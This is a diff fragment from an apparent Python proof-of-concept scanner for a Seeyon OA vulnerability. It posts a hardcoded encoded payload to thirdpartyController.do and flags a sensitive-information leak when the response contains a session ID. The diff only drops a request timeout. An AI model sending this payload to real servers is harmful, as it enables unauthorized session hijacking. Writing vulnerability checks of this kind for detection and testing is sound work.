@@ -46,7 +46,7 @@ class poc:
         url = "{}://{}/seeyon/thirdpartyController.do".format(scheme, netloc)
         data = '''method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'''
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if result.text.find("sessionid") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
